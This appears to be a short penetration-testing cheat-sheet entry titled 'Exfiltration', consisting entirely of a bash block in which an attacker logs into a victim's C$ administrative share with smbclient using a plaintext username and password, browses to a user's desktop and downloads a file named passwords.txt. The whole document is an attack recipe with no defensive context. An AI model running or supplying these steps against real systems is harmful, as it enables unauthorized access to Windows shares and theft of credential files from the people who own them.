# Exfiltration

## smbclient
```bash
# attacker Terminal 1:
mkdir loot               # make a dir for loot
cd loot                  # change to loot dir
smbclient //192.168.1.69/c$ -U john Password123! # login
cd users\victor\desktop  # its case insensitive
dir                      # list files to exfil
mget passwords.txt       # download a file
exit
```